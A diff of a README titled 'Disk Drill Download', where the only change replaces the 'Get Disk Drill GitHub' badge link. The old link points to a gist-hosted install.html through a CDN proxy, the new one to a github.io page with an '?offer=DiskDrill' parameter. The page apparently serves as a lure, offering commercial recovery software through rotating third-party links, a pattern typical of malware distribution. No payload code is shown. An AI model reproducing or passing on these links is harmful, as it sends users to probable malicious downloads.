@@ -1,6 +1,6 @@
 # Disk Drill Download — Desktop Data Recovery
 
-[![Get Disk Drill GitHub](https://img.shields.io/badge/Get%20Disk%20Drill%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/thebestfrag0-jpg/753823a9d79b76a8bcb1512608cea216/raw/60defc65d36512abe6acec2fd2d58ae70ddc4de0/install.html?offer=DiskDrill)
+[![Get Disk Drill GitHub](https://img.shields.io/badge/Get%20Disk%20Drill%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deployer.github.io/.github/?offer=DiskDrill)
 
 ---
 
